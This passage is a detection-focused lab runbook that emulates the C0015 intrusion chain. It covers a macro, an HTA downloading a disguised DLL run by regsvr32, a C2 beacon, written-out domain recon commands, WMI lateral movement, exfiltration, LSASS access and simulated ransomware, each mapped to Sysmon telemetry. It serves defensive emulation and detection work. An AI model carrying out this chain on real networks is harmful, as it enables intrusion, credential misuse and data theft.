# C0015 Attack-Chain Blueprint and Runbook

> **Purpose.** This document is the **single blueprint and runbook** for the C0015-inspired lab chain. It is the
> authoritative reference for: the run state object; the stage blueprint table (S1-S15); the per-transition handoff
> answers; the artifact schemas and handoff contracts; the technique coverage matrix; the runbook milestones with
> gates (M-0..M-10); the M-1 environment-verification checklist; and the C2/payload pointers. It is a design/runbook
> document — it does not record that stages have already run.
>
> **Surviving links.** This file may link only these documents:
> - `docs/attack-chain-plan.md` — historical fidelity, canonical phase map 0-15, and contradiction records.
> - `docs/correlation-architecture.md` — correlation dimensions and downgrade rules.
> - `docs/payloads-and-c2.md` — payload design and C2 decisions.
> - `docs/architecture.md` — lab infrastructure.
>
> **Governing rules.**
> - The chain is end-to-end **only when a single `run_id` has evidence for every mandatory handoff**. A missing
>   handoff is recorded as `CHAIN BROKEN AT S<n>`; it is never patched with timestamps, markers, or narrative.
> - The consumer must **actually consume** the artifact: read, parse, and use the output (artifact or state) to
>   branch or produce its own output. A file merely existing is not consumption.
> - A handoff is `SUPPORTED` only with producer/consumer evidence: an artifact created by the producer phase and
>   **read by the consumer phase**, all within the same run. Identical timestamps or matching marker names are not
>   sufficient.
> - Nothing is `PASS`. Keep factual statuses as they stand: `VERIFIED IN REPO` (offline/artifact-side claims),
>   `NOT RUN` (artifacts not yet created), `NARRATIVE ONLY`, `NOT VERIFIED` (VM-side claims), `ARTIFACT VERIFIED`
>   (sink-side single-file test), plus operational statuses `BLOCKED BY ENVIRONMENT`, `SENSOR GAP`, `PARTIAL`,
>   `PREVENTED`, `DENIED`, `INGEST/MAPPING GAP`, `UNRESOLVED`, `DESIGN ONLY`, `ANALYSIS / REPLAY ONLY`.
> - No secrets anywhere: credentials live only in the operator's secrets manager, never in the ledger, artifacts,
>   logs, or this document.

## 1. Evidence Labels and Status Vocabulary

Labels used across the chain:

| Label | Meaning |
|---|---|
| `[OBSERVED-C0015]` | Behavior directly recorded in C0015 sources (MITRE/DFIR). |
| `[INFERRED-C0015]` | Reasonable inference for C0015, not directly recorded. |
| `[UNKNOWN-C0015]` | Historical fact not established by any source. |
| `[SUPPLEMENTAL-LAB-TECHNIQUE]` | Added by lab design; not C0015 historical behavior. |
| `[LAB-VERIFIED]` | Verified on a real lab machine. |
| `[NOT-VERIFIED-IN-REPO]` | Narrative-only claim; not verifiable from this repository. |
| `[NOT RUN]` | Stage or artifact not executed/created yet. |

Classification of lab implementations: `LIVE LAB BEHAVIOR - READY TO TEST`; `LIVE LAB BEHAVIOR - DESIGN ONLY`;
`SAFE SURROGATE - PARTIAL`; `ANALYSIS / REPLAY ONLY`.

**Current status.** No stage is `PASS`; the chain is NOT end-to-end until one continuous run has evidence for all
handoffs. Sink-side receipt handling is `ARTIFACT VERIFIED` for a single 32-byte allowlisted test file; all VM-side
chain handoffs are `NOT RUN`, `NOT VERIFIED`, or `NARRATIVE ONLY` except the bootstrap primitives (E1 parent-child +
E7 hash continuity) that are `VERIFIED IN REPO`; the mshta hop (PID 6592 -> 6032/3604) remains `UNRESOLVED`.

## 2. Run State Object

One object per run, persisted in the run ledger (`evidence/run-ledger/RUN-<id>.json`, schema from M-0). All stage
artifacts carry the same `run_id`, and correlation maps telemetry back to the run via host/account/time-window plus
the ledger. See `docs/correlation-architecture.md` for how `run_id` attribution works — event logs do not carry a
standard run-id field.

| State key | Description |
|---|---|
| `run_id` | `RUN-YYYYMMDD-<seq>`; unique per run; the single key that must thread through every handoff. |
| `session1` | C2-SIM session-1 token for WS01 (`duc.user`) plus the server-side receipt S1 from S3. |
| `art04_01` | Discovery result from S5: readable share list (`ART-04-01`), with file path and SHA-256. |
| `art04_02` | Target manifest from S6 (`ART-04-02`): target host, account, allowed actions, selection reason derived from `art04_01`. |
| `art05_01` | Auth evidence bundle from S7 (`ART-05-01`): S4648/S4624/4672 references + LogonId. **Evidence only — never control input.** |
| `art06_01` | Remote-process evidence from S8 (`ART-06-01`): FS01 S4624/4672 + E1 `wmiprvse -> rundll32` + DLL hash + LogonId. |
| `session2` | C2-SIM session-2 token and the `ART-07-01` **server-side** registration receipt from S9 (stage `phase7-session2`). |
| `art08_01` | Staging manifest from S10 (`ART-08-01`): file list with SHA-256 and sizes. |
| `art09_01[r1]` | Sink receipt for transfer round 1 from S11a (`ART-09-01`). |
| `art09_01[r2]` | Sink receipt for transfer round 2 from S11b (`ART-09-01`). Two receipts must carry the same `run_id`. |
| `art10_01` | RDP bundle from S12 (`ART-10-01`): S4624 Type 10 + 4778/4779; depends on DET-008 (currently undefined). |
| `art12_01` | Impact manifest from S14: allowlist root plus file/bytes/time caps. |
| `art13_01` | Impact metrics from S14: what was transformed, plus restored-corpus verification. |
| `art14_01` | Recovery report from S14: count/hash/ACL verification after restore. |
| `art15_01` | Reconstruction scorecard from S15 (`ART-15-01`); ground truth ledger hidden in the investigation run. |

## 3. Environment and Verified Facts

### 3.1 Verified facts (handoff of 2026-09-26)

| Item | Verified fact |
|---|---|
| Domain | `c0015.lab` / `C0015`; DC01 at `.10` (DNS + LDAP + Netlogon OK); `nltest` reports `PASS` from WS01 and FS01. |
| Network | VMnet2 `192.168.50.0/24`, DHCP disabled; WS01 at `.20` (Ethernet1; Ethernet0 NAT `192.168.106.136` gateway `.2`); FS01 at `.30`; Kali planned at `.100`. |
| OS | WS01: Windows 10 (exact build pending); **FS01: Windows 10 Pro 19045**. |
| Sysmon (WS01/FS01) | 15.21, schema 4.91, at `C:\Tools\sysmon64.exe` + `C:\Tools\sysmon-c0015.xml`. **Live baseline: EID 1, 3, 11-14, 17-22 enabled; EID 7 and 10 DISABLED.** Exclusions: EID 3 -> `DC01:53`; EID 11 -> Elastic/Edge/diag; Registry include `Run/RunOnce/Services/Classes/Environment`; Registry exclude `VMware Tcpip`. |
| AD/ACL | `duc.user` in Finance; `it.admin` in IT-Admins (not Domain Admins). Shares: Finance = `C:\Shares\Finance` (Finance Change; `budget-q3.txt`, `payroll-notes.txt`); IT = `C:\Shares\IT` (IT-Admins Change; `server-inventory.txt`). **`it.admin` has no Finance rights.** |
| Elastic | 9.5.3; Fleet at `https://100.77.46.126:8220/`; policy `C0015-Windows-Endpoints`; namespace `c0015`; agents Healthy on WS01/FS01; per-enroll CA (`fleet-ca.crt`). |
| Office | WS01: ODT Word-only install (O365HomePremRetail, 64-bit), ClickToRunSvc running; **Word install state: pending verification — this is the S1 gate (M-1).** |

### 3.2 Sysmon configuration story

- Live config hash `D30CD93C83E3409F7AA1D45FEDEA2695B9F1481FF1D3DFF019AE2B8F01D99C18` differs from the committed
  repo config and from the working-tree variant — **the running config is a third variant not present in the repo**
  (baseline plus exclusions; no EID 2/5/6/7/8/10/15/25/26/29). The committed repo profiles are
  `sysmon-c0015-balanced.xml` (routine, scoped E7/E10/Registry) and `sysmon-c0015-capture.xml` (observation).
- The **CAPTURE profile** solves the E7 and E10 needs (EID 7 scoped for the S2/S9 ImageLoad acceptance;
  EID 10 for the S13b fixtures); the **BALANCED profile** is the routine, lower-volume default.
- **Chain consequence:** EID 7 is currently off on the live machines, so the S2/S9 ImageLoad hash acceptance cannot
  be collected unless the scoped EID 7 profile is deployed. M-1 decides and deploys, then pulls the live file back
  into the repo for hash reconcile.

### 3.3 NOT VERIFIED / open items

`DC01` OS edition/build; whether `DC01` runs an Elastic Agent; `FS01` Ethernet0/NAT IP; Kali and ELASTIC01 IPs;
vCPU/RAM/disk; snapshot inventory; exact WS01 build; **`it.admin` local-admin rights on FS01** (WMI `Win32_Process
Create` requires admin on the target; the earlier run-3B 4672 was narrative only); Elastic-to-repo parity rule; wmic
presence on the lab builds; loopback S5145 behavior; Kali clock skew; post-2026-09-19 claims
`[NOT-VERIFIED-IN-REPO]`; Phase 1 PID/entity conflict `UNRESOLVED`; Word install state (S1 gate).

### 3.4 C2 and payload pointers

- **C2-SIM** (`scripts/c2sim_v2.py`) is the surrogate beacon channel for S3 and S9: register/task/result with a
  fixed task allowlist (`T-DISCOVER-CORPUS`, `T-BEACON-SLEEP`, `T-NOOP`), stage/host/token validation, and
  **server-side `ART-07-01` receipts**. Run with `--port 8080 --ledger evidence/run-ledger --ip 192.168.50.1` —
  only on a lab host, with user approval.
- **Operator-layer C2 decisions** (CALDERA primary, Sliver optional conditional, Havoc not used), the payload
  inventory, and the 3-machine AD assessment live in `docs/payloads-and-c2.md`.
- **Payloads** live under `payloads/` (`docm/`, `hta/`, `dll/`, `beacon/`, `impact/`) with the code-to-technique
  map in `payloads/README.md`; the bounded impact simulator is `payloads/impact/c0015_impact.ps1`.

## 4. Stage Blueprint (S1-S15)

13-column blueprint. Stage facts are the contract; acceptance is not met by marker existence alone. Statuses such as
`BLOCKED BY ENVIRONMENT`, `SENSOR GAP`, `PARTIAL`, `PREVENTED` are preserved and never promoted to `PASS`.

| Stage | Objective | Host/account | Tool | Input | Behavior | Output | Next consumer | Telemetry | Correlation keys | Acceptance | Failure branch | Rollback |
|---|---|---|---|---|---|---|---|---|---|---|---|---|
| S1 Entry | User-execution entry | WS01 `duc.user` Medium | `test.docm` benign macro (**Word install: pending verification -> M-1 gate**) | `run_id` | Manual macro trigger (Alt+F8) -> VBA `Shell()` -> cmd | E1 chain + file drop | S2 | E1 WINWORD -> cmd; E11 | ProcessGuid (WS01); run_id | Macro really runs (side-effect file) + E1 + run_id | Macro does not fire -> `BLOCKED BY ENVIRONMENT`, stop | Close document, delete drop files, restore Desktop |
| S2 Bootstrap | HTA -> HTTP -> regsvr32 DLL | WS01 `duc.user` | mshta, regsvr32, HTTP host:8000; HTA benign **JS + VBS + base64** (T1027 / T1059.005 / T1059.007); DLL masqueraded `.jpg` (**T1036**) | S1 chain | HTA GET -> write DLL `c0015-comparefor.jpg` -> regsvr32 -> export runs (base64 decoded via MSXML `bin.base64`; HTA JScript has no `atob()`) | DLL + marker + hash continuity | S3 | E1 cmd -> mshta -> regsvr32; E7; E11; E3 (gap); server log | ProcessGuid; SHA-256 | E1 + E7 + E11 chain on same ProcessGuid; Kali<->WS01 hash matches; E3 gap recorded (**EID 7 needs scoped deploy — M-1**) | E7 missing -> `SENSOR GAP`, stop; mshta hop `UNRESOLVED` | Delete `C:\Users\Public\C0015\*`, stop HTTP service |
| S3 Session 1 | Bazar-like foothold | WS01 `duc.user` (session1) | C2-SIM v3 + benign agent (produced by S2) | S2 bootstrap | Public-IP mock -> register session1 -> task loop (dynamic tasking v3) | `session1` token + server receipt S1 | S4 | E1 agent; E3/E22; server log | token; host; time | Server-side receipt + at least 1 callback cycle + run_id | No receipt -> `PARTIAL`, stop S4 | Kill agent, delete token file |
| S4 Discovery | Recon | WS01 session1 | cmd, net, nltest, tasklist, ping | `session1` | Exact DFIR commands (tasks from C2-SIM): `tasklist /s`; `net group "domain admins" /dom`; `net localgroup "administrator"`; `nltest /domain_trusts /all_trusts`; `net view /all /domain`; `net view /all time` (T1124); `ping` (T1018) | Discovery telemetry | S5 | E1 (parent = agent); E3 (connection) | parent ProcessGuid | At least 4 behavior families DETECTED (C1) + run_id | Empty command results (small lab) -> record limitation | — |
| S5 Share artifact | Structured discovery output | WS01 session1 | net view / Get-SmbShare (read-only) | S4 | Enumerate shares -> `found_shares.txt` + `ART-04-01` | `art04_01` (hash) | S6 | E1 powershell; E11; S5145 (if probe) | file path + SHA-256 | Artifact exists, lists FS01\Finance readable + hash + run_id | No readable share -> S6 creates no manifest -> **chain stops** | Delete artifact |
| S6 Decision | Target selection from artifact | Kali / host orchestrator | Orchestrator (script) | `art04_01` | **Reads `art04_01`** -> rule (readable + high-value) -> writes `ART-04-02` | `art04_02` (target = FS01, account, actions, reason) | S7 | Ledger step (no endpoint event) | run_id; artifact id | `art04_02.target.host` derived from `art04_01` content (log reason); no hard-code | No valid target -> downstream `NOT RUN` | Delete manifest |
| S7 Auth controls | Determine permitted identity for WMI (validation only) | WS01 -> FS01 `it.admin` (per-run handle; **no secret recorded**) | Native logon controls (**explicit credential**) | `art04_02.auth` | Three controls with explicit credential: `duc.user` -> denied, `it.admin` -> allowed, revoked -> denied; **S7 grants no identity to any process** (`IPC$` / logon session != process token) | `art05_01` (LogonId + event refs — **EVIDENCE**, not control input for S8) | S8 (reads allowed account from `art04_02`; S8 uses explicit credential itself) | S4648; S4624 T3; S4672; S4625 | LogonId; user SID | denied/allowed/denied correct; LogonId linked; no secret in ledger/artifact/log | S4625 absent -> `INGEST/MAPPING GAP`, stop | Revoke account (control) |
| S8 WMI exec + tool handoff | Remote process on target | WS01 -> FS01 `it.admin` | 8a: SMB `\\FS01\C$\C0015\` copy (T1570 surrogate, IPC$ session); 8b: **WMI with explicit credential** — `runas it.admin -> wmic` (keep wmic.exe) OR `Invoke-CimMethod -Credential` (**never current process token = duc.user**) | `art04_02` + **explicit credential** + DLL (C2-SIM `/dl` or staging) | 8a copy `c0015_143_surrogate.dll` -> FS01; 8b WMI under `it.admin` identity (S4648 explicit cred) -> rundll32 runs on FS01 (**requires it.admin local admin on FS01 — verify M-1**) | `art06_01` (FS01 E1 `wmiprvse -> child` + DLL hash + LogonId) | S9 | S4648 (explicit cred WS01); S5140/S5145 (C$); E11 FS01; S4624/4672; S4688; E1 `wmiprvse -> rundll32` | LogonId; ProcessGuid | 4-gate: process on FS01 / identity / which process + DLL hash / callback at S9, same run_id; **identity = S4648 + LogonId matching the selected account**; **transfer has its own evidence (8a), not inferred from process execution** | wmic/runas unavailable -> CIM `-Credential` recorded `PARTIAL` (different telemetry); FS01 E1 missing -> `SENSOR GAP`, stop | Delete DLL on FS01; revoke handle |
| S9 Session 2 | Second foothold | FS01 `it.admin` (WMI context) | C2-SIM v3 (register/task/result) | `art06_01` | DLL (loaded by rundll32) registers session2 -> task `T-DISCOVER-CORPUS` -> result; register stage `phase7-session2` -> C2-SIM writes `ART-07-01` **server-side** receipt | `ART-07-01` receipt (server-side) | S10 | E1; E7; E11; E3; server receipt | token; host; LogonId | Receipt + callback telemetry on FS01 + S8 evidence; **marker alone NOT sufficient** | No valid receipt -> `PARTIAL`, **not called second foothold**, S10 changes context and records; **injection NOT performed — see S9b** | Kill rundll32, delete token |
| S9b Injection study | Telemetry study E10/E8 (no execution) | Toy `lab-target.exe` only if separately approved | Fixtures / replay | — | Historical analysis + fixture E10/E8; toy/replay only with per-use user approval | Analysis note | — | E10/E8 fixtures (synthetic) | — | No system process touched; **no injection code in repo** | — | — |
| S10 Collection/staging | Collect corpus + manifest | FS01 session2 | Corpus read + manifest | `session2` + `art04_02.allowed_actions` | Read `\\FS01\IT` (session2 = it.admin — T1039) + local lab-owned file (T1005); Finance read by duc.user at S4/S5 (verified, S5145) -> `ART-08-01` (file / SHA-256 / bytes) | `art08_01` | S11a | S5145 (loopback verify M-1); E11; E1 | file hash; bytes | Manifest <-> corpus match (count/bytes/hash) + run_id | S5145 does not fire (loopback) -> downgrade C4 to `CONTEXTUAL`, record | Delete staged copies |
| S11a Transfer r1 | Exfil round 1 (mirror day 1) | FS01 -> sink at 192.168.50.1:8081 | p5_sink (repo mirror) | `art08_01` | POST `/ingest/c0015-p5` of allowlisted file (**chunked <= 512 B = DESIGN ONLY — needs sink v2 to reassemble + hash; currently a single POST <= 1024 B = T1030 approximation**) | `art09_01[r1]` receipt | S12 | E3 (caveat); sink log; receipt | hash; client ip | `receipt.hash == manifest.hash == allowlist` | 403 -> `PREVENTED`, record | — |
| S12 RDP | Remote access (mirror day 2, between the two transfers) | WS01 <-> FS01 `it.admin` | Native RDP | after S11a | RDP session + observation | `art10_01` (DET-008) | S11b | S4624 Type 10; S4778/4779 | logon type; source | DET-008 defined + evidence + run_id | Audit misses S4778/4779 -> env-dependent, record | Close session |
| S11b Transfer r2 | Exfil round 2 (mirror day 4) | FS01 -> sink | p5_sink | `art08_01` | Second POST | `art09_01[r2]` | S13 | As S11a | As S11a | 2 receipts + same run_id | — | — |
| S13/S13b Precursor | AnyDesk-like + LSASS branch | FS01 admin | Portable legitimate app (optional); fixtures E10 | S11b | 13: optional install into unusual path; 13b: **E10 fixture lsass analysis (detection-design only)** — lab tool opens lsass with `PROCESS_QUERY_LIMITED_INFORMATION` -> E10 with access-mask analysis; **NO dump, NO read, NO credential**; high-rights patterns appear only in synthetic fixture replay | Note + install telemetry | S14 | E1/E11 path; E10 fixtures (synthetic) | path; target image | No sensitive data; no dump; branch = design only | — | Uninstall app; remove fixtures after use |
| S14 Impact + restore | Bounded impact + recovery | FS01 corpus allowlist, admin | Bounded simulator (`payloads/impact/c0015_impact.ps1`) | `art12_01` manifest | Transform corpus + note -> restore from backup -> verify (allowlist root + caps file/bytes/time; rename + extension + note; no real encryption, no propagation; allowlist root never system/drive-root) | `art13_01` + `art14_01` | S15 | E2/E11/E26; restore diff | root path; process | No exit from corpus; restore count/hash/ACL match | Restore mismatch -> `PARTIAL` + incident note | Restore from backup |
| S15 E2E x2 | Engineering + investigation runs | Whole lab | Runbook + scorecard | All state | Run 1: runbook visible; Run 2: analyst receives telemetry only (ledger hidden) | `art15_01` scorecard | — | Full correlation | run_id through the chain | Analyst reconstructs chain from telemetry; compare with ledger | Missing handoff -> `CHAIN BROKEN AT S<n>`, record, not called end-to-end | — |

## 5. Technique Coverage Matrix

Covers the **34 canonical techniques** plus **T1071.001** (additional context for the C2-over-web channel) and
**T1003.001** (supplemental LSASS-access study). Values below are exact from the coverage CSV; the `Limits` column
is the authoritative constraint statement and must be preserved in any downstream use.

| Technique | Behavior | Stage | Sysmon_IDs | Additional_sources | Limits |
|---|---|---|---|---|---|
| T1005 | Local data collection | S10 | 1,11 | Security 4663 + SACL; manifest | E11 observes staging writes, not source reads |
| T1016 | Network configuration discovery | S3 | 1,3,22 | HTTP or application logs | An IP-based lookup need not generate DNS; E3 has no response content |
| T1018 | Remote system discovery | S4 | 1,3,22 | PowerShell 4104; network sensor | E3 is TCP/UDP, not ICMP; command launch is not proof of results |
| T1021.001 | RDP | S12 | 1,3 | 4624 Type 10; 4778/4779; TerminalServices channels | Network connection alone does not establish interactive session |
| T1027 | Obfuscated files/information | S2 | 1,7,11 | Script/document artifact; AMSI/Defender when available | Sysmon does not capture HTA source or decode base64 |
| T1030 | Data transfer size limits | S11 | 1,3 | Sender configuration/log; flow bytes over time; receiver logs | Original campaign used bandwidth limiting; tiny POST/chunks are not equivalent evidence |
| T1036 | Masquerading | S2 | 1,7,11,29 | File bytes/type metadata | PE content and extension mismatch; no dependency on exact sample name |
| T1039 | Network share collection | S10 | 1,3,11 | FS01 5145 + 4663/SACL; manifest | 5145 is an access check, not proof complete file content was collected |
| T1047 | WMI execution | S8 | 1,3,7 | 4624/4648 as applicable; WMI-Activity/Operational | Sysmon 19-21 are subscription events, not remote process execution |
| T1055.001 | DLL injection | S9b | 7,8,10,25 | EDR/memory evidence; labeled replay if used | No individual ID covers all methods; E7 in rundll32 alone is not injection |
| T1057 | Process discovery | S4 | 1,10 | PowerShell 4104; application context | Task Manager GUI or in-process enumeration may lack separate command process |
| T1059.003 | Windows command shell | S1/S4 | 1 | 4688 as secondary source | Shell builtins may not create child processes; stdout is not in E1 |
| T1059.005 | Visual Basic | S2 | 1,7,11 | VBS/HTA artifact; script inspection/AMSI if available | Loaded engine does not disclose executed script |
| T1059.007 | JavaScript | S2 | 1,7,11 | JS/HTA artifact; script inspection/AMSI if available | PowerShell 4104 is not JScript logging |
| T1069.001 | Local group discovery | S4 | 1 | PowerShell 4104 where applicable | A command line does not show group membership results |
| T1069.002 | Domain group discovery | S4 | 1,3 | DC context; PowerShell 4104 where applicable | No separate Sysmon event type for domain enumeration |
| T1074.001 | Local staging | S5/S10 | 1,11,15,26 | 4663 + SACL; manifest and hashes | E11 does not provide content/hash of every staged file |
| T1083 | File/directory discovery | S14 | 1 | PowerShell 4104; file auditing where configured | GUI/in-process enumeration and shell builtins can escape E1 command granularity |
| T1105 | Ingress transfer | S2/S9 | 1,3,11,15,22,29 | HTTP/proxy/server logs; hashes | Network connection does not prove download completion; MOTW may be absent |
| T1124 | System time discovery | S4 | 1 | Script/application context | In-process time query has no dedicated Sysmon event |
| T1135 | Share discovery | S5 | 1,3,11 | 4104; 5145 if share objects are actually accessed | Discovery output and completed access are separate claims |
| T1204.002 | User execution | S1 | 1,11,15 | Document artifact and user/execution context | Office child process alone does not prove macro invocation or social engineering |
| T1218.005 | Mshta | S2 | 1,3,7,11,22 | HTA artifact and HTTP logs | Correlate parent/child by ProcessGuid; do not equate script execution with DLL injection |
| T1218.010 | Regsvr32 | S2 | 1,3,7,11,22 | ImageLoaded SHA256 and artifact | E1 is launch; E7 adds loaded-image evidence |
| T1218.011 | Rundll32 | S8/S9 | 1,3,7,11,22 | ImageLoaded SHA256; remote auth context if applicable | An ordinary load within rundll32 is not proof of remote injection |
| T1219.002 | Remote desktop software | S13 | 1,3,7,11,12-14,22,29 | Application/session logs; System 7045 if installed as service | Portable launch need not install service; legitimate relay IP is not malicious by itself |
| T1482 | Domain trust discovery | S4 | 1,3 | PowerShell 4104 where applicable; DC context | Single-domain lab can return limited results without sensor failure |
| T1486 | Encrypted impact | S14 | 1,11,26; 2 conditional | 4663; before/after manifest and file-content evidence | E2 is creation-time change; Sysmon is not full rename/write/entropy telemetry |
| T1553.002 | Code signing observation | S2/S9 | 6,7 | Signature validation context | Unsigned is not the same as invalid/revoked certificate; preserve separate fields |
| T1566.001 | Spearphishing attachment | S1 context | 1,11,15,29 (endpoint aftermath) | Mail gateway/message headers and document provenance | Endpoint Sysmon cannot establish delivery channel; historical delivery was assessed |
| T1567.002 | Cloud-storage exfiltration | S11 | 1,3,22 | Proxy/flow/application/receiver logs | Internal sink is surrogate, not proof of MEGA/cloud exfiltration |
| T1570 | Lateral tool transfer | S8 | 1,3,11,29 | 5145/4663 on recipient; source/target hash continuity | Historical transfer mechanism is uncertain; lab SMB-copy choice remains labeled |
| T1588.001 | Obtain malware capability | Pre-intrusion | None directly | Threat intelligence/provenance | Outside endpoint Sysmon scope; document-only mapping |
| T1588.002 | Obtain tool capability | Pre-intrusion | None directly | Threat intelligence/provenance | File landing later does not establish earlier acquisition activity |
| T1071.001 | Web protocols (additional context) | S3/S9 | 1,3,22 | HTTP/proxy/flow/server logs | Additional mapping, not one of canonical 34; HTTPS content not exposed by E3 |
| T1003.001 | LSASS access study (supplemental) | S13b | 10; 1,6,11 supporting | EDR; approved artifact/replay evidence | E10 or low-rights access does not establish credential extraction |

## 6. Handoff Contracts

### 6.1 Handoff overview (producer -> artifact/state -> consumer)

Each handoff is `SUPPORTED` only when the producer created the artifact and the consumer actually read it, within
the same run. P-numbers are the canonical phase numbering used in `docs/attack-chain-plan.md`; the S-column maps to
the stage blueprint in section 4.

| # | Producer phase | Artifact / state | Consumer phase | Required evidence |
|---|---|---|---|---|
| H0 | P0 baseline (M-0) | Sensor matrix + run ledger schema | P1..P15 | Ledger file `evidence/run-ledger/RUN-<id>.json` (schema from M-0) |
| H1 | P1 entry (S1) -> P2 bootstrap (S2) | Chain telemetry bundle (E1 chain + E7/E11) — **not an artifact file** | P2/P3 session (S2/S3) | E1 parent-child + E7 hash continuity (bootstrap primitives verified in repo); mshta hop `UNRESOLVED` (see M-1) |
| H2 | P3/P4 discovery (S4/S5) | `ART-04-01` discovery result -> `found_shares`-like artifact (`C:\ProgramData\found_shares.txt` — DFIR path mirror, `[LAB ASSUMPTION]` format) | P4 decision / orchestration (S6) | Verified primitives; artifact not yet created — `NOT RUN` |
| H3 | P4 decision (S6) | `ART-04-02` target manifest (target = FS01, justification, run_id, auth account) | P5/P6 (S7/S8) | Not yet created — must be produced on the first decision run |
| H4 | P5 auth bridge (S7) | `ART-05-01` auth evidence bundle (S4648/4624/4672 + LogonId) | P6 (S8) | `NARRATIVE ONLY` — evidence, not control input |
| H5 | P6 WMI (S8) | `ART-06-01` remote-process evidence (FS01 S4624/4672 + E1 `wmiprvse -> child`) | P7 (S9) | `NARRATIVE ONLY` |
| H6 | P7 143.dll surrogate (S9) | `ART-07-01` **session-2 registration receipt (server-side, C2-SIM)** + `ART-07-02` endpoint callback telemetry | P8 (S10) | `NOT VERIFIED` — this is the P7 closing criterion |
| H7 | P8 collection/staging (S10) | `ART-08-01` staging manifest (file, SHA-256, size, perms) | P9 (S11) | Sink verified; VM side `NOT VERIFIED` |
| H8 | P9 transfer (S11a/S11b) | `ART-09-01` sink receipt (timestamp, client, bytes, hash) | P10/P15 (S12/S15) | 1 file verified; run record missing |
| H9 | P10 RDP (S12) | `ART-10-01` RDP session bundle (S4624 Type 10, 4778/4779) | P11/P15 (S13/S15) | `NARRATIVE ONLY` |
| H10 | P11 precursor (S13/S13b) | `ART-11-01` telemetry analysis note (AnyDesk-like, Process Access — **analysis only**) | P12 (S14) | Not run |
| H11 | P12 impact prep (S14) | `ART-12-01` impact manifest (allowlist root, caps) | P13 (S14) | Not run |
| H12 | P13 impact (S14) | `ART-13-01` impact metrics + restored corpus verification | P14 (S14) | Not run |
| H13 | P14 validation (S14) | `ART-14-01` recovery report (count/hash/ACL) | P15 (S15) | Not run |
| H14 | P15 E2E (S15) | `ART-15-01` reconstruction scorecard (ground truth hidden in the investigation run) | — | Not run |

### 6.2 Five questions per transition

Every transition answers: (1) what is the output; (2) where is it consumed; (3) how is the same
host/identity/artifact/run proven; (4) what stops the chain; (5) how is real consumption demonstrated.

**S1 -> S2 (entry -> bootstrap).**
Output: the E1 chain (WINWORD -> cmd -> mshta) plus the file drop — a telemetry bundle, not an artifact file.
Consumed: S2 bootstrap fires from that chain on WS01 under `duc.user` (HTA GET, then regsvr32). Proven: E1
parent-child sharing a ProcessGuid chain on WS01; run_id recorded in the ledger for S1..S2. Macro invocation itself
is `[INFERRED]` plus manual trigger `[LAB-SURROGATE]` (limitation stated in `docs/attack-chain-plan.md`). Stop:
macro does not fire -> `BLOCKED BY ENVIRONMENT`; M-1 verifies the Word install state before S1 can run. Real
consumption: S2 executes only when the E1 chain exists; the chain is the input, not the existence of a marker.

**S2 -> S3 (bootstrap -> session 1).**
Output: the benign agent process spawned from `C:\Users\Public\C0015\` (DLL + marker + hash continuity).
Consumed: S3 runs the session-1 loop through that agent process. Proven: E1 parent-child (mshta/regsvr32 -> agent),
E7 ImageLoad hash of the agent DLL (requires the scoped EID 7 profile, M-1), and the register POST from WS01 with
the token. Stop: agent has no E1 or does not register -> `PARTIAL`, stop S4. Real consumption: the server receipt
records the token sent by that agent — not that a file exists.

**S5 -> S6 (discovery artifact -> decision).**
Output: `ART-04-01` (share list with readable flags and sample files). Consumed: S6 orchestration opens and parses
`ART-04-01`, applies the rule (readable + high-value), and writes `ART-04-02` with a `selection_reason` drawn from
the artifact content. Proven: ledger step records `read_artifact: ART-04-01` plus the selection reason; artifact
hash recorded; same run_id. Stop: artifact empty/unparseable or no readable share -> no `ART-04-02` -> downstream
`NOT RUN` (chain stops at S6). Real consumption: parse and branch on content — the target is never hard-coded.

**S7 -> S8 (auth evidence -> WMI) — the identity correction.**
Output: `ART-05-01` auth evidence bundle (S4648/S4624/4672 + LogonId). Consumed: S8 reads the allowed account from
`ART-04-02`, not from `ART-05-01`. `ART-05-01` is **EVIDENCE** — it proves which credential was used; it is NOT
control input. The control input of S8 is the **explicit operator-provided credential** (runas / PSCredential);
it is never read from any bundle and never placed in the ledger. Critical facts: a `net use \\FS01\IPC$` session
does **not** change the WS01 process token, so `wmic` run directly still uses the current token (duc.user) and
fails with `Access is denied`; the `IPC$` session is used only for 8a (SMB copy). S8b must run WMI under the
`it.admin` identity. Proven identity: S4648 (explicit credential) on WS01 + S4624/4672 LogonId on FS01 matching the
selected account; no secret in ledger/artifact/log (schema forbids password/secret keys — `scripts/lab_tools.py
artifact-check`). Stop: S4625 absent -> `INGEST/MAPPING GAP`; the explicit-credential WMI path must pass at M-1 or
the gate fails. Real consumption: the explicit credential is consumed by runas/CIM at S8; the evidence bundle only
proves the credential was exercised.

**S8 -> S9 (WMI exec + tool handoff -> session 2).**
Output: `ART-06-01` (FS01 E1 `wmiprvse -> rundll32` + DLL hash + LogonId) plus the DLL now on FS01. Consumed: at S9
the DLL loaded by rundll32 registers session 2. Proven: 8a (tool handoff) carries its own evidence (S5140/S5145 +
E11); 8b (execution) carries E1 `wmiprvse -> child`; identity is proven by S4648/S4624/4672 LogonId, **not** by the
8a `IPC$` session. The 4-gate closes only together: process on FS01 / identity / which process + DLL hash /
callback at S9, same run_id. T1570 (transfer facet) and T1047 (execution facet) are two separate evidence lines.
Stop: FS01 E1 missing -> `SENSOR GAP`; no valid receipt at S9 -> `PARTIAL`. Real consumption: S9 register/task/
result runs only after `ART-06-01` is verified.

**S9 -> S10 -> S11 (session 2 -> collection -> sink).**
Output: `ART-07-01` server-side receipt (session 2) -> `ART-08-01` staging manifest -> POST to sink ->
`ART-09-01` receipt. Proven: hash chain `manifest.hash == receipt.hash == allowlist`; sender evidence (E1/E3) plus
receiver evidence (sink log) under the same run_id. Stop: no valid receipt -> `PARTIAL` (not "second foothold");
sink returns 403 -> `PREVENTED`; loopback S5145 absent -> C4 downgraded to `CONTEXTUAL`. Real consumption: the sink
accepts only allowlisted hashes, and the receipt is generated by the sink from the bytes actually received.

**S11a -> S12 -> S11b (transfer round 1 -> RDP -> transfer round 2).**
The source timeline order is preserved (day 1 -> day 2 -> day 4); RDP runs only between the two receipts within
the same run. Never reorder for lab convenience. Output: `ART-09-01[r1]` -> `ART-10-01` (RDP bundle) ->
`ART-09-01[r2]`. Proven: two receipts with the same run_id; S4624 Type 10 + 4778/4779 for RDP. Stop: DET-008
undefined -> RDP acceptance cannot close; audit missing 4778/4779 -> env-dependent, record. Real consumption: S12
reads receipt r1 as its precondition; S11b posts the same manifest a second time.

**S14 -> restore (bounded impact -> recovery).**
The simulator processes only the corpus allowlist (fixed root; caps on files/bytes/time; no system paths, UNC,
